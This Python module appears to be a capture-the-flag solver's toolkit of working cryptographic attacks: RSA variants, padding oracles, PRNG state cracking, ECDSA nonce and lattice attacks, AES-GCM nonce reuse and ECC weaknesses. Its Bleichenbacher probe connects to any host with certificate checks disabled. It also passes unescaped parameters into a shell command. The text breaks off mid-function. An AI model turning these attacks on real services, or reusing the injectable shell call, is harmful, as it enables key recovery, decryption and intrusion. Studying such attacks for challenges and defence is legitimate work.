"""Cryptographic attack implementations."""
from __future__ import annotations
import math, struct, hashlib, itertools, re, subprocess


def tool_crypto_attack(attack, **params):
    """Dedicated crypto attacks — RSA variants, padding oracle, hash extension, PRNG."""
    try:
        attack = attack.lower()

        if attack == "rsa_small_e":
            # RSA with small public exponent — try eth root
            n = int(params.get("n",0)); e = int(params.get("e",3))
            c = int(params.get("c",0))
            code = f"""
from gmpy2 import iroot
import gmpy2
n,e,c = {n},{e},{c}
# Try direct eth root first (m^e < n)
root,exact = iroot(c,e)
if exact:
    print("Direct eth root:", root)
    m_bytes = root.to_bytes((root.bit_length()+7)//8,'big')
    print("Plaintext:", m_bytes)
else:
    # Hastad broadcast / add multiples of n
    for k in range(2000):
        candidate = c + k*n
        root,exact = iroot(candidate,e)
        if exact:
            print(f"Found at k={k}: m={root}")
            m_bytes = root.to_bytes((root.bit_length()+7)//8,'big')
            print("Plaintext:", m_bytes)
            break
    else:
        print("eth root failed — try Coppersmith or different approach")
"""
            return tool_execute_python(code)

        if attack == "rsa_wiener":
            n = int(params.get("n",0)); e = int(params.get("e",0))
            code = f"""
from fractions import Fraction
def wiener(e,n):
    def cf(n,d):
        while d:
            yield n//d
            n,d=d,n%d
    def convergents(cf_list):
        n0,n1,d0,d1=0,1,1,0
        for a in cf_list:
            n0,n1=n1,a*n1+n0
            d0,d1=d1,a*d1+d0
            yield n1,d1
    for k,d in convergents(list(cf({e},{n}))):
        if k==0: continue
        if ({e}*d-1)%k: continue
        phi=({e}*d-1)//k
        b=-(({n}-phi+1))
        disc=b*b-4*{n}
        if disc<0: continue
        import math
        sq=int(math.isqrt(disc))
        if sq*sq==disc and ((-b+sq)%2==0):
            p,q=(-b+sq)//2,(-b-sq)//2
            if p*q=={n}: return d,p,q
    return None
result=wiener({e},{n})
if result:
    d,p,q=result
    print(f"Wiener attack succeeded! d={{d}}, p={{p}}, q={{q}}")
    c=int('{params.get("c",0)}')
    if c: print("Plaintext int:", pow(c,d,{n}))
else:
    print("Wiener failed — d may not be small enough")
"""
            return tool_execute_python(code)

        if attack == "rsa_factor_known_phi":
            n = int(params.get("n",0)); e = int(params.get("e",65537)); c = int(params.get("c",0))
            phi = int(params.get("phi",0))
            code = f"""
import math
n,e,phi,c={n},{e},{phi},{c}
# Recover p,q from n and phi
# phi = (p-1)(q-1) = n - p - q + 1, so p+q = n - phi + 1
s=n-phi+1; disc=s*s-4*n
sq=int(disc**0.5)
for sq2 in [sq-1,sq,sq+1]:
    if sq2*sq2==disc:
        p,q=(s+sq2)//2,(s-sq2)//2
        if p*q==n:
            d=pow(e,-1,phi)
            m=pow(c,d,n)
            print(f"p={{p}}, q={{q}}, d={{d}}")
            print("Plaintext:", m.to_bytes((m.bit_length()+7)//8,'big'))
            break
else:
    print("Could not recover factors from phi")
"""
            return tool_execute_python(code)

        if attack == "rsa_common_modulus":
            n = int(params.get("n",0)); e1 = int(params.get("e1",0)); e2 = int(params.get("e2",0))
            c1 = int(params.get("c1",0)); c2 = int(params.get("c2",0))
            code = f"""
from math import gcd
def egcd(a,b):
    if b==0: return a,1,0
    g,x,y=egcd(b,a%b); return g,y,x-a//b*y
n,e1,e2,c1,c2={n},{e1},{e2},{c1},{c2}
g,s,t=egcd(e1,e2)
if g!=1: print("GCD not 1, cannot directly attack")
else:
    if s<0: c1=pow(c1,-1,n); s=-s
    if t<0: c2=pow(c2,-1,n); t=-t
    m=pow(c1,s,n)*pow(c2,t,n)%n
    print("Plaintext int:",m)
    print("Plaintext bytes:",m.to_bytes((m.bit_length()+7)//8,'big'))
"""
            return tool_execute_python(code)

        if attack == "rsa_lsb_oracle":
            # LSB oracle / parity oracle attack
            return "LSB oracle attack: use execute_python with pwntools to interact with the oracle server, halving the plaintext range each query until m is recovered."

        if attack == "cbc_padding_oracle":
            return tool_execute_python(f"""
# CBC Padding Oracle attack skeleton
# Requires: oracle function that returns True if padding is valid
# Usage: implement oracle(), then call padding_oracle_decrypt(ciphertext, block_size, oracle)
def padding_oracle_decrypt(ciphertext, block_size, oracle):
    blocks = [ciphertext[i:i+block_size] for i in range(0,len(ciphertext),block_size)]
    plaintext = b""
    for bi in range(1,len(blocks)):
        ct_block = blocks[bi]; prev_block = bytearray(blocks[bi-1])
        intermediate = bytearray(block_size)
        for byte_pos in range(block_size-1,-1,-1):
            pad_val = block_size - byte_pos
            for guess in range(256):
                modified_prev = bytearray(prev_block)
                modified_prev[byte_pos] = guess
                for k in range(byte_pos+1,block_size):
                    modified_prev[k] = intermediate[k] ^ pad_val
                if oracle(bytes(modified_prev) + ct_block):
                    if byte_pos==block_size-1:
                        # Verify it's not a fluke
                        modified_prev[byte_pos-1] ^= 1
                        if not oracle(bytes(modified_prev)+ct_block): continue
                    intermediate[byte_pos] = guess ^ pad_val
                    break
        plaintext += bytes(x^y for x,y in zip(intermediate,prev_block))
    return plaintext
print("Padding oracle template ready. Implement oracle() and call padding_oracle_decrypt().")
print("Example: oracle = lambda ct: requests.post(url, data=ct).text != 'Invalid padding'")
""")

        if attack == "hash_length_extension":
            algo = params.get("algo","sha256"); secret_len = int(params.get("secret_len",0))
            known_hash = params.get("known_hash",""); known_msg = params.get("known_msg","")
            append_msg = params.get("append_msg","")
            return tool_execute_shell(f"hash_extender --data '{known_msg}' --secret {secret_len} --append '{append_msg}' --signature '{known_hash}' --format {algo} 2>/dev/null || echo 'hash_extender not found — try: pip install hashpumpy'")

        if attack == "aes_ecb_byte_at_a_time":
            return "ECB byte-at-a-time: use execute_python to implement oracle calls, detect block size, then brute-force one byte at a time by crafting blocks where only the last byte is unknown."

        if attack == "mt19937_crack":
            # Mersenne Twister crack from 624 outputs
            return tool_execute_python("""
# MT19937 crack — needs 624 consecutive 32-bit outputs
# Install randcrack: pip install randcrack
try:
    from randcrack import RandCrack
    rc = RandCrack()
    # Feed 624 outputs: rc.submit(output)
    # Then predict: rc.predict_randbelow(N) or rc.predict_getrandbits(32)
    print("randcrack available. Feed 624 outputs via rc.submit(), then predict.")
except ImportError:
    print("Install randcrack: pip install randcrack")
    print("Manual approach: implement MT state recovery from 624 32-bit outputs")
""")

        if attack == "ecdsa_nonce_reuse":
            code = f"""
# ECDSA nonce reuse attack (same k used twice)
# Given: r1==r2 (same nonce), two signatures (r,s1),(r,s2), two messages m1,m2
# k = (m1-m2) * modinv(s1-s2, n)
# privkey = (s1*k - m1) * modinv(r, n)
from hashlib import sha256
import json
params = {json.dumps(params)}
r=int(params.get('r',0)); s1=int(params.get('s1',0)); s2=int(params.get('s2',0))
m1=int(params.get('m1',0)); m2=int(params.get('m2',0)); n=int(params.get('n',0))
if r and s1 and s2 and m1 and m2 and n:
    def modinv(a,m):
        return pow(a,-1,m)
    k = (m1-m2)*modinv(s1-s2,n)%n
    privkey = (s1*k-m1)*modinv(r,n)%n
    print(f"k = {{k}}")
    print(f"Private key = {{privkey}}")
else:
    print("Provide r,s1,s2,m1,m2,n (all as integers)")
"""
            return tool_execute_python(code)

        if attack == "xor_key_length":
            # Kasiski / IC analysis for key length
            ciphertext = params.get("ciphertext","")
            code = f"""
import itertools, base64
ct_hex = '{ciphertext}'
try:
    ct = bytes.fromhex(ct_hex)
except:
    try: ct = base64.b64decode(ct_hex + '==')
    except: ct = ct_hex.encode()

def ic(text):
    n=len(text); freq=dict()
    for b in text: freq[b]=freq.get(b,0)+1
    return sum(f*(f-1) for f in freq.values())/(n*(n-1)) if n>1 else 0

results=[]
for keylen in range(1,33):
    blocks=[ct[i::keylen] for i in range(keylen)]
    avg_ic=sum(ic(b) for b in blocks)/len(blocks)
    results.append((keylen,avg_ic))

results.sort(key=lambda x:-x[1])
print("Key length candidates (by Index of Coincidence, higher=better):")
for kl,ic_val in results[:8]:
    print(f"  Length {{kl:3d}}: IC={{ic_val:.4f}}")
print("\\nEnglish IC ≈ 0.065, random IC ≈ 0.038")
"""
            return tool_execute_python(code)

        return f"Unknown attack: {attack}. Available: rsa_small_e, rsa_wiener, rsa_factor_known_phi, rsa_common_modulus, rsa_lsb_oracle, cbc_padding_oracle, hash_length_extension, aes_ecb_byte_at_a_time, mt19937_crack, ecdsa_nonce_reuse, xor_key_length"

    except Exception as e:
        return f"Crypto attack error: {e}\n{traceback.format_exc()}"


def tool_z3_solve(constraints_code):
    """Run Z3 SMT solver for constraint solving (CTF math, reverse engineering)."""
    code = f"""
from z3 import *
{constraints_code}
"""
    return tool_execute_python(code)


def tool_sage_math(code):
    """Run SageMath for advanced math — LLL lattice reduction, elliptic curves, factoring."""
    result = _shell(f"sage -c \"{code.replace(chr(34),chr(39))}\" 2>&1", timeout=60)
    if "sage: command not found" in result or "not found" in result.lower():
        return f"SageMath not installed. Running in Python:\n{tool_execute_python(code)}"
    return result


def tool_dlog(operation: str = "auto", **params) -> str:
    """
    Discrete logarithm: baby_giant, pohlig_hellman, ecc_dlog, index_calculus, auto.
    Params: g,h,p (prime field) or Gx,Gy,Px,Py,a,b (ECC). n=group order, factors=[(q,e)...]
    """
    op = operation.lower()
    g = params.get("g",0); h = params.get("h",0); p = params.get("p",0)

    if op in ("baby_giant","auto"):
        n = params.get("n",0)
        code = f"""
from math import isqrt, ceil
g,h,p,n = {g},{h},{p},{n or '(p-1)'}
m=ceil(isqrt(n))+1; table={{}}; gj=1
for j in range(m): table[gj]=j; gj=gj*g%p
gm=pow(pow(g,m,p),-1,p); val=h
for i in range(m):
    if val in table:
        x=i*m+table[val]; print(f"x={{x}}"); print(f"Verify: {{pow(g,x,p)}}=={{h}}"); break
    val=val*gm%p
else: print("BSGS failed — try pohlig_hellman or index_calculus")
"""
        result = tool_execute_python(code, timeout=60)
        if "x=" in result or op != "auto": return result
        op = "pohlig_hellman"

    if op == "pohlig_hellman":
        factors = params.get("factors",[])
        n = params.get("n", p-1) if p else 0
        code = f"""
g,h,p,n = {g},{h},{p},{n}
factors = {factors}
if not factors:
    remaining=n or (p-1); facs=[]
    for pr in [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139]:
        if remaining%pr==0:
            e=0
            while remaining%pr==0: remaining//=pr; e+=1
            facs.append((pr,e))
    if remaining>1: facs.append((remaining,1))
    factors=facs; print(f"Factors of group order: {{factors}}")
from math import isqrt,ceil
residues=[]; moduli=[]
for (q,e) in factors:
    qe=q**e; ns=(n or p-1)//qe
    gs=pow(g,ns,p); hs=pow(h,ns,p)
    m=ceil(isqrt(qe))+1; table={{}}; gj=1
    for j in range(m): table[gj]=j; gj=gj*gs%p
    gm=pow(pow(gs,m,p),-1,p); val=hs; xs=None
    for i in range(m):
        if val in table: xs=i*m+table[val]; break
        val=val*gm%p
    residues.append((xs or 0)%qe); moduli.append(qe)
    print(f"  x={{xs or 0}} (mod {{qe}})")
M=1
for m in moduli: M*=m
x=0
for r,m in zip(residues,moduli): Mi=M//m; x+=r*Mi*pow(Mi,-1,m)
x%=M; print(f"x={{x}}"); print(f"Verify: {{pow(g,x,p)}}=={{h}}")
"""
        return tool_execute_python(code, timeout=120)

    if op == "ecc_dlog":
        sage_code = (f"p,a,b={params.get('p',0)},{params.get('a',0)},{params.get('b',0)}\n"
                     f"E=EllipticCurve(GF(p),[a,b])\n"
                     f"G=E({params.get('Gx',0)},{params.get('Gy',0)})\n"
                     f"P=E({params.get('Px',0)},{params.get('Py',0)})\n"
                     f"n={params.get('order',0)} or G.order()\n"
                     f"x=discrete_log(P,G,n,operation='+')\n"
                     f"print(f'x={{x}}'); print(f'Verify: {{x*G}}')")
        return tool_sage_math(sage_code)

    if op == "index_calculus":
        return tool_sage_math(f"p={p};g={g};h={h}\nprint(discrete_log(Mod(h,p),Mod(g,p)))")

    return f"Unknown op '{operation}'. Available: baby_giant, pohlig_hellman, ecc_dlog, index_calculus, auto"


def tool_rng_crack(operation, outputs=None, bits=32, modulus=None, multiplier=None, increment=None):
    """
    PRNG cracking.
    - mt19937_from_outputs: Crack Python's random / MT19937 from 32-bit outputs (needs z3 or randcrack)
    - mt19937_predict_boundary: From Python random.randrange(2**63) boundary strings → predict next
    - lcg_crack: Crack Linear Congruential Generator from consecutive outputs
    - python_random_from_randbits63: Crack Python random from getrandbits(63) calls (like email boundaries)
    """
    outputs = outputs or []
    try:
        if operation == "mt19937_from_outputs":
            return tool_execute_python(f"""
outputs = {outputs}
try:
    from randcrack import RandCrack
    rc = RandCrack()
    for o in outputs[:624]:
        rc.submit(int(o))
    print("State cracked! Next predictions:")
    for i in range(5):
        print(f"  getrandbits(32): {{rc.predict_getrandbits(32)}}")
except ImportError:
    print("Install randcrack: pip install randcrack")
    print("Or use z3_crack from: https://github.com/icemonster/symbolic_mersenne_cracker")
""")

        if operation == "python_random_from_randbits63":
            # This is the exact technique from secure-email-service:
            # Python's email module uses random.randrange(sys.maxsize) = randrange(2**63)
            # which calls getrandbits(63) = two 32-bit words with top bit stripped
            return tool_execute_python(f"""
# Crack Python random.randrange(2**63) from observed boundary values
# Each boundary = random.randrange(2**63) = getrandbits(63)
# Internally: two 32-bit MT words, top bit of word1 stripped → 31 + 32 = 63 bits
boundaries = {outputs}
print(f"Have {{len(boundaries)}} boundary observations")

try:
    # Try z3_crack (symbolic MT cracker that handles missing bits)
    # From: https://github.com/icemonster/symbolic_mersenne_cracker
    import importlib.util, sys, os
    # Look for z3_crack in same directory or PATH
    for search_dir in [os.path.dirname(__file__) if '__file__' in dir() else '.', '.', '/tmp']:
        z3_path = os.path.join(search_dir, 'z3_crack.py')
        if os.path.exists(z3_path):
            spec = importlib.util.spec_from_file_location("z3_crack", z3_path)
            z3_crack = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(z3_crack)
            break
    else:
        raise ImportError("z3_crack not found")

    ut = z3_crack.Untwister()
    for b in boundaries:
        b = int(b)
        bin_str = bin(b)[2:].zfill(63)
        half1 = bin_str[:31] + '?'  # top bit stripped by Python
        half2 = bin_str[31:]
        ut.submit(half2)
        ut.submit(half1)
    r2 = ut.get_random()
    print("State cracked!")
    print("Next 5 predictions (getrandbits(63)):")
    for i in range(5):
        print(f"  {{r2.getrandbits(63)}}")
    print("\\nFormat as email boundary (%019d):")
    for i in range(5):
        print(f"  {{('%019d' % r2.getrandbits(63))}}")
except ImportError as e:
    print(f"Missing: {{e}}")
    print("Download z3_crack.py from:")
    print("  https://github.com/icemonster/symbolic_mersenne_cracker/blob/main/main.py")
    print("Place it in the same directory as solver.py")
    print()
    print("Alternatively, use randcrack with 32-bit values split from 63-bit outputs:")
    for b in boundaries[:3]:
        b = int(b)
        print(f"  boundary={b} → hi32={b>>31} lo32={b&0x7fffffff}")
""")

        if operation == "lcg_crack":
            # Linear Congruential Generator: x_{n+1} = (a*x_n + c) % m
            return tool_execute_python(f"""
outputs = {outputs}
modulus = {modulus or 0}
multiplier = {multiplier or 0}
increment = {increment or 0}
# If m,a,c known: just predict
if modulus and multiplier:
    x = outputs[-1] if outputs else 0
    for i in range(5):
        x = (multiplier * x + increment) % modulus
        print(f"Next: {{x}}")
elif len(outputs) >= 3:
    # Recover m from consecutive diffs
    from math import gcd
    diffs = [outputs[i+1]-outputs[i] for i in range(len(outputs)-1)]
    zeros = [diffs[i+1]*diffs[i-1] - diffs[i]**2 for i in range(1,len(diffs)-1)]
    m = abs(zeros[0])
    for z in zeros[1:]: m = gcd(m,abs(z))
    if m and len(outputs) >= 2:
        a = (outputs[2]-outputs[1]) * pow(outputs[1]-outputs[0],-1,m) % m
        c = (outputs[1] - a*outputs[0]) % m
        print(f"Recovered: m={{m}}, a={{a}}, c={{c}}")
        x = outputs[-1]
        for i in range(5):
            x = (a*x+c)%m
            print(f"Next: {{x}}")
    else:
        print("Need more outputs or known parameters")
else:
    print("Need at least 3 outputs for unknown LCG, or provide modulus+multiplier")
""")

        if operation == "xorshift_crack":
            return tool_execute_python(f"""
# XorShift RNG crack - common in CTF challenges
outputs = {outputs}
# Try common xorshift variants
def xorshift32(x):
    x ^= (x << 13) & 0xFFFFFFFF
    x ^= (x >> 17) & 0xFFFFFFFF
    x ^= (x << 5)  & 0xFFFFFFFF
    return x & 0xFFFFFFFF
if outputs:
    # Try to find seed that matches
    seed_candidates = [int(o) for o in outputs[:2]]
    for seed in seed_candidates:
        seq = [seed]
        for _ in range(10):
            seq.append(xorshift32(seq[-1]))
        print(f"From seed {{seed}}: {{seq}}")
""")

        return f"Unknown operation. Available: mt19937_from_outputs, python_random_from_randbits63, lcg_crack, xorshift_crack"
    except Exception as e:
        return f"RNG crack error: {e}"


def tool_factordb(n: str) -> str:
    """
    Look up RSA modulus factorization on factordb.com.
    If already factored by the community, returns p and q instantly.
    Essential first step for any RSA challenge before attempting other attacks.
    """
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        n_int = int(str(n).strip())
        r = requests.get(f"https://factordb.com/api", params={"query": str(n_int)}, timeout=15)
        data = r.json()
        status = data.get("status", "")
        factors = data.get("factors", [])

        status_map = {
            "FF":  "Fully factored",
            "CF":  "Composite, factors known",
            "C":   "Composite, factors unknown",
            "P":   "Prime",
            "PRP": "Probable prime",
            "U":   "Unknown",
        }
        label = status_map.get(status, status)
        lines = [f"FactorDB result for n ({len(str(n_int))} digits): {label}"]

        if factors:
            lines.append(f"Factors:")
            factor_vals = []
            for f_pair in factors:
                fval = int(f_pair[0])
                fexp = int(f_pair[1])
                factor_vals.extend([fval]*fexp)
                lines.append(f"  {fval}^{fexp}")

            if len(factor_vals) == 2:
                p, q = sorted(factor_vals)
                lines.append(f"\np = {p}")
                lines.append(f"q = {q}")
                lines.append(f"\n# Decrypt RSA:")
                lines.append(f"from Crypto.Util.number import inverse")
                lines.append(f"phi = (p-1)*(q-1)")
                lines.append(f"d = inverse(e, phi)")
                lines.append(f"m = pow(c, d, n)")
        else:
            lines.append("Not factored. Try: rho attack, yafu, msieve, CADO-NFS for large composites.")
            lines.append(f"Bit length: {n_int.bit_length()}")
            if n_int.bit_length() <= 512:
                lines.append("→ Feasible with CADO-NFS or msieve on modern hardware")
            elif n_int.bit_length() <= 768:
                lines.append("→ Very hard. Check for weak key patterns first.")
        return "\n".join(lines)
    except ImportError:
        return "pip install requests"
    except Exception as e:
        return f"FactorDB error: {e}"


def tool_coppersmith(operation: str, **params) -> str:
    """Coppersmith small-root attacks via SageMath: small_e, partial_p, franklin_reiter, hastad, custom."""
    op = operation.lower()
    N = params.get("N",0); e = params.get("e",0)
    if op == "small_e":
        m_high=params.get("m_high",0); c=params.get("c",0); m_bits=params.get("m_bits",256); beta=params.get("beta",1.0)
        return tool_sage_math(f"N,e,c,m_high,m_bits={N},{e},{c},{m_high},{m_bits}\nP.<x>=PolynomialRing(Zmod(N))\nf=(m_high+x)^e-c\nroots=f.small_roots(X=2^(m_bits//e),beta={beta})\nprint(f'roots={{roots}}')\nif roots: print(f'm={{m_high+int(roots[0])}}') ")
    if op == "partial_p":
        p_high=params.get("p_high",0); p_bits=params.get("p_bits",512)
        return tool_sage_math(f"N,p_high,p_bits={N},{p_high},{p_bits}\nP.<x>=PolynomialRing(Zmod(N))\nf=p_high*2^(p_bits//2)+x\nroots=f.small_roots(X=2^(p_bits//2),beta=0.4)\nprint(roots)\nfor r in roots:\n p=p_high*2^(p_bits//2)+int(r)\n if N%p==0: print(f'p={{p}} q={{N//p}}')")
    if op == "franklin_reiter":
        c1=params.get("c1",0); c2=params.get("c2",0); r=params.get("r",0); s=params.get("s",0)
        return tool_sage_math(f"N,e,c1,c2,r,s={N},{e},{c1},{c2},{r},{s}\nP.<x>=PolynomialRing(Zmod(N))\nf1=x^e-c1; f2=(r*x+s)^e-c2\ndef gcd_p(a,b):\n while b: a,b=b,a%b\n return a.monic()\ng=gcd_p(f1,f2)\nif g.degree()==1: print(f'm={{-g[0]}}')")
    if op == "hastad":
        cs=params.get("ciphertexts",[]); ns=params.get("moduli",[])
        return tool_sage_math(f"e,cs,ns={e},{cs},{ns}\nfrom functools import reduce\nM=reduce(lambda a,b:a*b,ns)\nx=sum(cs[i]*(M//ns[i])*inverse_mod(M//ns[i],ns[i]) for i in range(len(ns)))%M\nprint(Integer(x).nth_root(e))")
    if op == "custom":
        poly=params.get("polynomial","x"); X=params.get("X","2^256"); beta=params.get("beta",1.0)
        return tool_sage_math(f"N={N}\nP.<x>=PolynomialRing(Zmod(N))\nf={poly}\nprint(f.small_roots(X={X},beta={beta}))")
    return "Available: small_e, partial_p, franklin_reiter, hastad, custom"


def tool_ecdsa_lattice(operation: str = "hnp", **params) -> str:
    """ECDSA lattice attack (hidden number problem) for biased/partial nonces."""
    n  = params.get("n",0); sigs = params.get("signatures",[]); k = params.get("k",0)
    leaks = params.get("leaks",[]); leak_type = params.get("leak_type","msb")
    sage = f"""n={n}; k={k}; sigs={sigs}; leaks={leaks}; leak_type=\'{leak_type}\'
m=len(sigs)
if m<2: print("Need >=2 sigs"); exit()
# HNP lattice — Boneh-Venkatesan
# For MSB leak: nonce d_i = known_high_i * 2^(n_bits-k) + unknown_i
# Build (m+2) x (m+2) lattice
from sage.all import Matrix,ZZ,vector
rows=[]; B=2^(n.bit_length()-k)
for i,(r,s,h) in enumerate(sigs):
    row=[0]*(m+2)
    row[i]=n
    rows.append(row)
# Solve-row
t_row=[0]*(m+2)
for i,(r,s,h) in enumerate(sigs): t_row[i]=inverse_mod(int(s),n)*int(r)%n
t_row[m]=1; rows.append(t_row)
u_row=[0]*(m+2)
for i,(r,s,h) in enumerate(sigs): u_row[i]=(inverse_mod(int(s),n)*int(h))%n
u_row[m+1]=n; rows.append(u_row)
M=Matrix(ZZ,rows); L=M.LLL()
print("LLL done. Short rows (candidate private keys):")
for row in L[:5]: print(f"  {{row}}")"""
    return tool_sage_math(sage)


def tool_lll(matrix_rows: list, operation: str = "lll", **params) -> str:
    """LLL lattice reduction, SVP, CVP. Claude builds the matrix; this runs the math."""
    rows_str = str(matrix_rows)
    if operation == "lll":
        return tool_sage_math(f"M=Matrix(ZZ,{rows_str})\nL=M.LLL()\nprint(L)\nprint(f'Shortest: {{min(L.rows(),key=lambda r:r.norm())}}') ")
    if operation == "svp":
        return tool_sage_math(f"M=Matrix(ZZ,{rows_str})\nL=M.LLL()\ns=min(L.rows(),key=lambda r:r.norm())\nprint(f'SVP: {{s}} norm={{s.norm().n():.2f}}')")
    if operation == "cvp":
        t = params.get("target",[])
        return tool_sage_math(f"M=Matrix(ZZ,{rows_str}); t=vector(ZZ,{t})\nL=M.LLL()\nv=t\nG,_=L.gram_schmidt()\nfor i in reversed(range(len(L.rows()))): v=v-round((v*G[i])/(G[i]*G[i]))*L[i]\nprint(f'CVP: {{t-v}}')")
    return "Available: lll, svp, cvp"


def tool_aes_gcm_attack(operation: str, **params) -> str:
    """AES-GCM attacks: nonce_reuse (keystream recovery + forgery), key_recover."""
    if operation == "nonce_reuse":
        c1=params.get("c1",""); c2=params.get("c2","")
        t1=params.get("t1",""); t2=params.get("t2","")
        code = f"""c1,c2=bytes.fromhex(\'{c1}\'),bytes.fromhex(\'{c2}\')
t1,t2=bytes.fromhex(\'{t1}\'),bytes.fromhex(\'{t2}\')
xored=bytes(a^b for a,b in zip(c1,c2))
print(f'C1 XOR C2 (=P1 XOR P2): {{xored.hex()}}')
print(f'If P1 known: P2 = known_P1 XOR xored')
tag_diff=bytes(a^b for a,b in zip(t1,t2))
print(f'Tag diff: {{tag_diff.hex()}} → H is root of GF(2^128) polynomial')
print('Use forbidden_attack sage implementation to recover H, then forge any tag')"""
        return tool_execute_python(code)
    if operation == "forbidden_attack":
        return tool_sage_math("# AES-GCM forbidden attack over GF(2^128)\n# H = auth key, recovered when nonce reused\nR.<x>=GF(2)[]\nF.<a>=GF(2^128,modulus=x^128+x^7+x^2+x+1)\nprint(\"GF(2^128) field ready — build polynomial from tag/ciphertext differences and find roots\")")
    return "Available: nonce_reuse, forbidden_attack"


def tool_bleichenbacher(host: str, port: int = 443, operation: str = "probe", **params) -> str:
    """RSA PKCS#1 v1.5 padding oracle: probe (detect oracle), skeleton (attack code)."""
    if operation == "probe":
        code = f"""import socket,ssl,os,time
host,port=\'{host}\',{port}
rand_c=os.urandom(256)
s=socket.socket(); s.settimeout(5); s.connect((host,port))
if port==443:
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    s=ctx.wrap_socket(s,server_hostname=host)
t0=time.time()
try: s.send(rand_c); resp=s.recv(4096); print(f'{{time.time()-t0:.3f}}s {{repr(resp[:80])}}')
except Exception as e: print(f'{{time.time()-t0:.3f}}s {{e}}')
s.close()
print(\"If timing varies for valid/invalid padding → oracle exists → use skeleton\")"""
        return tool_execute_python(code, timeout=15)
    if operation == "skeleton":
        n=params.get("n",0); e=params.get("e",65537); c=params.get("c",0)
        return f"""# Bleichenbacher skeleton — implement oracle(), then run
from Crypto.Util.number import *
n,e,c = {n},{e},{c}; k=n.bit_length()//8
def oracle(ct_int):
    # Return True if server indicates valid PKCS1 padding
    return False  # replace with live oracle response logic for target service
B=2**(8*(k-2)); two_B=2*B; three_B=3*B
M=[(two_B,three_B-1)]; s=n//(three_B)
# Main loop — see Bleichenbacher 1998
"""
    return "Available: probe, skeleton"


def tool_differential_cryptanalysis(operation: str, **params) -> str:
    """Differential/linear cryptanalysis for custom CTF ciphers."""
    if operation == "collect_pairs":
        pairs = params.get("pairs",[])
        code = f"""pairs={pairs}
from collections import Counter
diffs=[(int(p1,16)^int(p2,16),int(c1,16)^int(c2,16)) for p1,p2,c1,c2 in pairs]
for pd,cd in diffs[:10]: print(f\'dP={{hex(pd)}} dC={{hex(cd)}}\')
ct_freq=Counter(cd for _,cd in diffs); print(f\'Most common dC: {{ct_freq.most_common(5)}}\')"""
        return tool_execute_python(code)
    if operation == "guess_key":
        pairs=params.get("pairs",[]); target=params.get("target_diff",0); sbox=params.get("sbox",[])
        code = f"""from collections import Counter
pairs={pairs}; target={target}; sbox={sbox}
scores=Counter()
for k in range(256):
    cnt=0
    for p1,p2,c1,c2 in pairs[:200]:
        dc1=(sbox.index(int(c1,16)^k) if sbox and (int(c1,16)^k)<len(sbox) else int(c1,16)^k)
        dc2=(sbox.index(int(c2,16)^k) if sbox and (int(c2,16)^k)<len(sbox) else int(c2,16)^k)
        if (dc1^dc2)==target: cnt+=1
    scores[k]=cnt
for k,c in scores.most_common(8): print(f\'key={{hex(k)}} score={{c}}\')"""
        return tool_execute_python(code)
    if operation == "linear_approx":
        sbox=params.get("sbox",[])
        code = f"""sbox={sbox}
n=len(sbox)
for a in range(n):
    for b in range(n):
        cnt=sum(1 for x in range(n) if bin(x&a).count(\'1\')%2==bin(sbox[x]&b).count(\'1\')%2)
        bias=cnt/n-0.5
        if abs(bias)>0.1: print(f\'in={{hex(a)}} out={{hex(b)}} bias={{bias:.3f}}\')"""
        return tool_execute_python(code)
    return "Available: collect_pairs, guess_key, linear_approx"


def tool_ecc_special_attacks(operation: str = "detect", **params) -> str:
    """ECC special attacks: Smart's attack (anomalous curves), MOV attack (supersingular),
    invalid curve, twist attack, pohlig-hellman for smooth-order curves."""

    if operation == "detect":
        p = params.get("p", 0); a = params.get("a", 0); b = params.get("b", 0)
        n = params.get("n", 0)  # curve order
        code = f"""
try:
    from sage.all import *
    p,a,b,n = {p},{a},{b},{n}
    if not (p and a and b and n):
        print("Provide p, a, b, n (curve order) to detect attack type")
        exit()
    F = GF(p)
    E = EllipticCurve(F, [a,b])
    card = E.order()
    print(f"Curve order: {{card}}")
    print(f"Provided n:  {{n}}")
    # Smart's attack: p == card
    if card == p:
        print("[!] SMART'S ATTACK APPLICABLE: #E(Fp) == p (anomalous curve)")
        print("    DLP is solvable in O(log p) time — essentially free!")
    else:
        print(f"    Smart's: card={{card}}, p={{p}} — NOT anomalous")
    # MOV attack: embedding degree
    k = 1
    q = p
    while (q-1) % card != 0 and k < 20:
        k += 1; q *= p
    print(f"    MOV embedding degree: {{k}}")
    if k <= 6:
        print(f"[!] MOV ATTACK APPLICABLE: embedding degree {{k}} is small")
        print(f"    Reduce DLP to Fp^{{k}} where standard DLP algorithms work")
    # Pohlig-Hellman: smooth order
    from sage.all import factor
    factors = factor(card)
    print(f"    Order factorization: {{factors}}")
    max_factor = max(int(f**e) for f,e in list(factors))
    if max_factor < 2**40:
        print(f"[!] POHLIG-HELLMAN APPLICABLE: largest prime factor is {{max_factor}} (< 2^40)")
    # Check for small cofactor / invalid curve potential
    cofactor = card // n if n and card % n == 0 else None
    print(f"    Cofactor h: {{cofactor}}")
    if cofactor and cofactor > 1:
        print(f"[!] SMALL COFACTOR: h={{cofactor}} — check for small-subgroup/invalid-curve")
except ImportError:
    print("SageMath required for curve analysis. Fallback analysis:")
    p,n = {p},{n}
    if p and n and p == n:
        print("[!] p == n: LIKELY SMART'S ATTACK (anomalous curve)")
    elif p and n:
        print(f"p={hex(p)}, n={hex(n)}, p==n: {p==n}")
        print("Cannot compute embedding degree without SageMath")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=30)

    if operation == "smart":
        # Smart's attack: lift to Z/pZ via p-adic logarithm
        p = params.get("p",0); a = params.get("a",0); b = params.get("b",0)
        Gx = params.get("Gx",0); Gy = params.get("Gy",0)
        Px = params.get("Px",0); Py = params.get("Py",0)
        code = f"""
try:
    from sage.all import *
    p,a,b = {p},{a},{b}
    Gx,Gy = {Gx},{Gy}
    Px,Py = {Px},{Py}
    F = GF(p)
    E = EllipticCurve(F, [a,b])
    G = E(Gx,Gy); P = E(Px,Py)
    # Smart's attack via Hensel lift to Qp
    # Lift E to Qp (p-adic numbers)
    Qp_prec = 10
    K = Qp(p, Qp_prec)
    EK = EllipticCurve(K, [K(a),K(b)])
    # Lift G and P
    def hensel_lift(pt, E_K, p):
        x,y = pt.xy()
